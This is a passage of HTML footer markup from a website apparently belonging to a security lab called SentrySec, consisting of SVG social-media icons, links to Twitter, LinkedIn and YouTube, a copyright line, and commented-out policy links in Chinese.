                                <path d="M10.2965 16.7999H12.9405V27.6799C12.9405 27.786 12.9826 27.8877 13.0576 27.9628C13.1327 28.0378 13.2344 28.0799 13.3405 28.0799H17.8205C17.9266 28.0799 18.0283 28.0378 18.1033 27.9628C18.1783 27.8877 18.2205 27.786 18.2205 27.6799V16.8359H21.2605C21.3575 16.8369 21.4516 16.8025 21.5252 16.7392C21.5988 16.6759 21.6469 16.588 21.6605 16.4919L22.1205 12.4919C22.1255 12.4364 22.1189 12.3805 22.101 12.3278C22.0832 12.275 22.0545 12.2265 22.0169 12.1855C21.9792 12.1445 21.9334 12.1117 21.8824 12.0894C21.8313 12.0671 21.7762 12.0557 21.7205 12.0559H18.2005V9.53992C18.2005 8.78392 18.6005 8.39992 19.4005 8.39992H21.6925C21.7986 8.39992 21.9003 8.35778 21.9753 8.28276C22.0503 8.20775 22.0925 8.10601 22.0925 7.99992V4.31992C22.0925 4.21384 22.0503 4.11209 21.9753 4.03708C21.9003 3.96206 21.7986 3.91992 21.6925 3.91992H18.4005C16.9464 3.92501 15.5431 4.45481 14.4485 5.41192C13.9315 5.8638 13.5348 6.43694 13.294 7.07992C13.0531 7.7229 12.9756 8.41561 13.0685 9.09592V12.0319H10.2965C10.1904 12.0319 10.0887 12.0741 10.0136 12.1491C9.93863 12.2241 9.89648 12.3258 9.89648 12.4319V16.3999C9.89648 16.506 9.93863 16.6077 10.0136 16.6828C10.0887 16.7578 10.1904 16.7999 10.2965 16.7999Z" fill="#222222"></path>
                            </svg>
                        </a>
                        <a class="lh-1 dib mr2" title="Twitter" target="_blank" rel="noopener" href="https://twitter.com/bin4xin">
                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path>
                                <path d="M23.917 10.7759C23.6572 10.8922 23.3899 10.9911 23.117 11.0719C23.4414 10.7016 23.6865 10.2687 23.837 9.79988C23.8553 9.74704 23.8566 9.68979 23.8407 9.63616C23.8249 9.58253 23.7927 9.53519 23.7486 9.5008C23.7045 9.4664 23.6507 9.44666 23.5948 9.44435C23.539 9.44203 23.4838 9.45725 23.437 9.48788C22.867 9.82828 22.2476 10.0779 21.601 10.2279C21.0705 9.71367 20.3936 9.37678 19.6635 9.26372C18.9335 9.15065 18.1863 9.26699 17.5252 9.59667C16.8641 9.92635 16.3216 10.4531 15.9726 11.1043C15.6236 11.7554 15.4854 12.4988 15.577 13.2319C14.3655 13.1234 13.188 12.7738 12.1137 12.2037C11.0393 11.6335 10.0898 10.8543 9.32096 9.91188C9.29299 9.87906 9.25762 9.85336 9.21777 9.83689C9.17792 9.82043 9.13472 9.81368 9.09174 9.81719C9.04876 9.82071 9.00724 9.8344 8.97059 9.85712C8.93394 9.87984 8.90322 9.91095 8.88096 9.94788C8.56783 10.4919 8.40236 11.1082 8.40096 11.7359C8.39878 12.5818 8.69961 13.4006 9.24896 14.0439C9.0844 13.9873 8.92512 13.9163 8.77296 13.8319C8.73235 13.8102 8.68701 13.7988 8.64096 13.7988C8.59491 13.7988 8.54957 13.8102 8.50896 13.8319C8.46844 13.8548 8.43459 13.8879 8.41075 13.9279C8.3869 13.9678 8.37388 14.0133 8.37296 14.0599V14.1079C8.37409 14.7252 8.53538 15.3317 8.84107 15.8681C9.14676 16.4044 9.58638 16.8523 10.117 17.1679C10.0255 17.1604 9.93467 17.1471 9.84496 17.1279C9.79894 17.12 9.75169 17.124 9.70761 17.1394C9.66354 17.1548 9.62409 17.1811 9.59296 17.2159C9.56317 17.2506 9.54276 17.2923 9.53366 17.3371C9.52456 17.3819 9.52707 17.4283 9.54096 17.4719C9.72712 18.0654 10.0661 18.5996 10.5238 19.0209C10.9816 19.4421 11.542 19.7356 12.149 19.8719C11.1397 20.504 9.97183 20.8368 8.78096 20.8319C8.52009 20.8284 8.25965 20.8097 8.00096 20.7759C7.94069 20.7687 7.87975 20.7822 7.82814 20.8141C7.77652 20.846 7.73728 20.8946 7.71683 20.9517C7.69639 21.0089 7.69595 21.0713 7.71559 21.1287C7.73524 21.1862 7.7738 21.2352 7.82496 21.2679C9.37642 22.2633 11.1816 22.791 13.025 22.7879C14.3751 22.8191 15.7157 22.5538 16.9521 22.0106C18.1885 21.4673 19.2907 20.6594 20.181 19.6439C21.7606 17.848 22.6409 15.5435 22.661 13.1519C22.661 13.0559 22.661 12.9559 22.661 12.8599C23.2844 12.3901 23.8252 11.8196 24.261 11.1719C24.2928 11.1232 24.3081 11.0656 24.3048 11.0076C24.3015 10.9496 24.2797 10.8941 24.2426 10.8494C24.2054 10.8046 24.1549 10.773 24.0985 10.759C24.0421 10.7451 23.9826 10.7496 23.929 10.7719L23.917 10.7759Z" fill="#222222"></path>
                            </svg>
                        </a>
                        <a class="lh-1 dib mr2" title="LinkedIn" target="_blank" rel="noopener" href="https://www.linkedin.com/#">
                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path>
                                <path d="M17.0123 14.7596V14.7236L16.9883 14.7596H17.0123Z" fill="#222222"></path><path d="M11.3962 24.0561H7.79621V13.2001H11.3962V24.0561ZM9.60021 11.7001H9.57621C9.31915 11.7177 9.06122 11.6821 8.81857 11.5954C8.57591 11.5088 8.35376 11.3729 8.16602 11.1965C7.97828 11.02 7.82899 10.8067 7.7275 10.5698C7.62601 10.333 7.57451 10.0778 7.57621 9.82009C7.57621 8.75209 8.37621 7.94009 9.62021 7.94009C9.87894 7.92022 10.139 7.95412 10.384 8.03965C10.6289 8.12519 10.8536 8.26052 11.0437 8.43711C11.2338 8.61371 11.3853 8.82775 11.4887 9.06576C11.592 9.30378 11.645 9.56061 11.6442 9.82009C11.6362 10.8641 10.8522 11.7001 9.60021 11.7001ZM24.4322 24.0561H20.8002V18.2401C20.8002 16.7801 20.2802 15.7801 18.9722 15.7801C18.564 15.782 18.1664 15.9103 17.834 16.1474C17.5017 16.3845 17.2509 16.7187 17.1162 17.1041C17.0231 17.3877 16.9824 17.6859 16.9962 17.9841V24.0601H13.3962C13.3962 24.0601 13.4442 14.2041 13.3962 13.1841H16.9962V14.7241C17.3244 14.1561 17.8016 13.6886 18.3761 13.3721C18.9506 13.0556 19.6008 12.902 20.2562 12.9281C22.6322 12.9281 24.4162 14.4841 24.4162 17.8241L24.4322 24.0561Z" fill="#222222"></path>
                            </svg>
                        </a>
                        <a class="lh-1 dib mr2" title="Youtube" target="_blank" rel="noopener" href="https://www.youtube.com/channel/UClJ81qWUWtySnemTo7njueA">
                            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <path d="M16 32C24.8366 32 32 24.8366 32 16C32 7.16344 24.8366 0 16 0C7.16344 0 0 7.16344 0 16C0 24.8366 7.16344 32 16 32Z" fill="white"></path><path d="M24.0555 19.9478C23.964 20.3766 23.741 20.7662 23.4176 21.0623C23.0943 21.3584 22.6867 21.5463 22.2515 21.5998C20.1732 21.7893 18.086 21.8627 15.9995 21.8198C13.9131 21.8628 11.8258 21.7893 9.74752 21.5998C9.31377 21.5476 8.90704 21.3617 8.58377 21.0678C8.2605 20.7739 8.03674 20.3867 7.94352 19.9598C7.69907 18.6548 7.60113 17.3266 7.65152 15.9998C7.60334 14.6769 7.70262 13.3528 7.94752 12.0518C8.04104 11.6259 8.26439 11.2394 8.58677 10.9457C8.90915 10.6519 9.3147 10.4654 9.74752 10.4118C11.8256 10.2186 13.9128 10.1411 15.9995 10.1798C18.0873 10.1369 20.1759 10.2104 22.2555 10.3998C22.6889 10.4532 23.095 10.6396 23.4181 10.9333C23.7411 11.2269 23.9652 11.6135 24.0595 12.0398C24.3026 13.345 24.3992 14.6732 24.3475 15.9998C24.397 17.3226 24.2991 18.6468 24.0555 19.9478Z" fill="#222222"></path><path d="M13.8438 18.5923L19.1517 15.8403C17.3717 14.9123 15.5997 14.0003 13.8438 13.0723V18.5923Z" fill="white"></path>
                            </svg>
                        </a>
                    </div>

                    <div class="flex flex-wrap items-center fw5 lh-copy f1 mt0 mt3-ns footer-bottom-row-text-links-margin">
                        <span class="fw5 pr1 inline-flex">© 2019-2021 SentrySec, Lab. Build by Jekyll under the terms of the MIT License.</span>
                        <!-- <a class="bl inline-flex white lh-solid fw5 ph1" href="/privacypolicy/">隐私政策</a>
                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/website-terms/">使用条款</a>
                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/disclosure/">披露</a>
                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/abuse/">信任与安全</a>
                        <button class="bl inline-flex white lh-solid fw5 ph1 bg-transparent outline-transparent pointer">Cookie 首选项</button>
                        <a class="bl inline-flex white lh-solid fw5 ph1" href="/trademark/">商标</a> -->
                    </div>
                </div>
            </div><!-- "/pv5" -->
        </div>
    </div>
</div><!--/footerwrap -->

    </body>
</html>